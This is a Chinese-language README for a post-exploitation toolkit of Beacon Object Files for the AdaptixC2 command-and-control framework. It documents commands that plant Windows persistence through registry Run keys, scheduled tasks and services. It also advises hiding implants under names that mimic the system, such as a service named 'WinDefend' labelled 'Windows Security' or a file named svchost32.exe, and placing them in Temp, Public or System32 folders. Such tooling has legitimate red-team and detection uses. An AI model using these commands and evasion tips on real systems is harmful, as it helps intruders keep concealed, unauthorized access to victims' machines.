# Persistence-BOF

Windows 持久化机制 BOF 合集，支持三种常用持久化方法。

## 📋 功能列表

| BOF | 需要Admin | 隐蔽性 | 触发时机 | 文件 |
|-----|-----------|--------|----------|------|
| Registry Run Keys | HKLM需要 | ⭐⭐ | 用户登录 | `registry_run.x64.o` |
| Scheduled Tasks | 需要 | ⭐⭐⭐ | 可配置 | `schtask.x64.o` |
| Service Persistence | 需要 | ⭐⭐⭐⭐ | 系统启动 | `service_persist.x64.o` |

---

## 🚀 快速开始

### 1. Registry Run Keys
最简单的持久化方法，HKCU 不需要 admin 权限。

```bash
# 添加持久化 (HKCU)
persist registry-run --add MyApp C:\Windows\Temp\app.exe

# 添加持久化 (HKLM, 需要admin)
persist registry-run --add MyApp C:\Windows\Temp\app.exe --hklm

# 删除持久化
persist registry-run --remove MyApp
```

### 2. Scheduled Tasks
灵活的触发器，支持多种执行时机。

```bash
# 用户登录时运行
persist schtask --create MyTask C:\Windows\Temp\app.exe --trigger ONLOGON

# 每天运行
persist schtask --create MyTask C:\Windows\Temp\app.exe --trigger DAILY

# 每小时运行
persist schtask --create MyTask C:\Windows\Temp\app.exe --trigger HOURLY

# 删除任务
persist schtask --delete MyTask
```

### 3. Service Persistence
最隐蔽的持久化方式，系统级服务。

```bash
# 创建自动启动服务
persist service --create MySvc "My Service" C:\Windows\Temp\app.exe --auto

# 创建手动启动服务
persist service --create MySvc "My Service" C:\Windows\Temp\app.exe

# 启动服务
persist service --start MySvc

# 删除服务
persist service --delete MySvc
```

---

## 📖 详细文档

完整的使用指南、最佳实践和故障排查，请参考：

**`/docs/PERSISTENCE_USAGE_GUIDE.md`**

---

## 🛠️ 编译

```bash
make
```

编译后的 BOF 文件位于 `_bin/` 目录：
- `registry_run.x64.o`
- `schtask.x64.o`
- `service_persist.x64.o`

---

## 📂 文件结构

```
Persistence-BOF/
├── _bin/                      # 编译后的 BOF 文件
│   ├── registry_run.x64.o
│   ├── schtask.x64.o
│   └── service_persist.x64.o
├── _include/
│   └── beacon.h              # Beacon API 头文件
├── registry_run/
│   └── registry_run.c        # Registry 持久化源码
├── schtask/
│   └── schtask.c             # Scheduled Task 源码
├── service/
│   └── service_persist.c     # Service 持久化源码
├── persist.axs               # AxScript 集成
├── Makefile                  # 编译脚本
└── README.md                 # 本文件
```

---

## 🎯 使用场景

### 低权限持久化
**用户权限** → Registry Run Keys (HKCU)
```bash
persist registry-run --add Update C:\Users\Public\update.exe
```

### 高权限隐蔽持久化
**Admin权限** → Scheduled Task
```bash
persist schtask --create WinUpdate C:\Windows\System32\update.exe --trigger ONLOGON
```

### 最强持久化
**Admin/SYSTEM** → Service
```bash
persist service --create WinDefend "Windows Security" C:\Windows\System32\svc.exe --auto
persist service --start WinDefend
```

---

## ⚠️ 注意事项

### 1. Beacon 类型
- **Registry/Schtask**: 普通 beacon
- **Service**: 需要服务模式 beacon 或服务包装器

### 2. 路径选择
推荐使用系统相关目录：
- `C:\Windows\Temp\`
- `C:\Users\Public\`
- `C:\ProgramData\`
- `C:\Windows\System32\` (需要admin)

### 3. 命名建议
使用系统相关名称增强隐蔽性：
- `WindowsUpdate.exe`
- `SecurityService.exe`
- `svchost32.exe`

### 4. 清理
退出前务必清理持久化：
```bash
persist registry-run --remove YourApp
persist schtask --delete YourTask
persist service --delete YourService
```

---

## 🔍 验证

### Registry
```bash
shell reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
shell reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Scheduled Task
```bash
shell schtasks /query /tn YourTask /v
```

### Service
```bash
shell sc query YourService
shell sc qc YourService
```

---

## 📝 AxScript API

### Registry Run Keys
```javascript
ax.execute_alias(id, cmdline, 
    `execute bof ${bof_path} ${bof_params}`, 
    message);

// BOF 参数格式
ax.bof_pack("int,int,cstr,cstr", [
    action,      // 0=add, 1=remove
    location,    // 0=HKCU, 1=HKLM
    valueName,   // Registry value name
    programPath  // Program path
]);
```

### Scheduled Task
```javascript
// BOF 参数格式
ax.bof_pack("int,cstr,cstr,cstr", [
    action,      // 0=create, 1=delete
    taskName,    // Task name
    programPath, // Program path
    trigger      // ONLOGON, DAILY, HOURLY
]);
```

### Service
```javascript
// BOF 参数格式
ax.bof_pack("int,cstr,cstr,cstr,int", [
    action,      // 0=create, 1=delete, 2=start
    serviceName, // Service name
    displayName, // Display name
    binaryPath,  // Binary path
    startType    // 2=AUTO_START, 3=DEMAND_START
]);
```

---

## 🐛 故障排查

### Registry 失败
1. 检查权限（HKLM 需要 admin）
2. 检查路径是否存在
3. 验证注册表是否写入成功

### Scheduled Task 失败
1. 确认有 admin 权限
2. 检查任务名是否冲突
3. 查看任务调度器日志

### Service 失败
1. 确认有 admin 权限
2. 检查服务名是否已存在
3. 确认程序支持服务模式
4. 查看系统事件日志

---

## 📚 相关资源

- **完整文档**: `/docs/PERSISTENCE_USAGE_GUIDE.md`
- **开发总结**: `/docs/DEVELOPMENT_SESSION_SUMMARY.md`
- **进度报告**: `/docs/PROGRESS_SUMMARY.md`

---

## 📊 技术细节

### 实现方式

| BOF | Windows API |
|-----|-------------|
| Registry | RegOpenKeyExA, RegSetValueExA, RegDeleteValueA |
| Scheduled Task | CreateProcessA (调用 schtasks) |
| Service | OpenSCManagerA, CreateServiceA, StartServiceA, DeleteService |

### 编译标志
```makefile
-O2                        # 优化
-mno-stack-arg-probe      # 消除栈检查符号
--strip-unneeded          # 精简 BOF
```

---

## ✅ 状态

- **编译**: ✅ 所有 BOF 编译成功
- **AxScript**: ✅ 完全集成
- **测试**: ⏳ 等待用户测试
- **文档**: ✅ 完整

---

## 📄 许可

与 AdaptixC2 主项目相同

---

**版本**: v1.0  
**创建时间**: 2025-10-26  
**作者**: AdaptixC2 Team

